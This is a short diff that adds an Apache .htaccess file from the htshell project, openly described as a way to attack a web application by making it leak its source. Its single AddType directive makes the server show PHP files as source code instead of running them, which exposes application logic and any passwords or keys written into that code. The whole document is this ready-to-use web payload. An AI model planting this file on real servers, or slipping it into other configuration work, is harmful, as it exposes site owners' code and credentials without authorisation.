@@ -1,0 +1,3 @@
+# Attack a web application by forcing it to leak source - Part of the htshell project
+# Written by Wireghoul - http://www.justanotherhacker.com
+AddType application/x-httpd-php-source .php
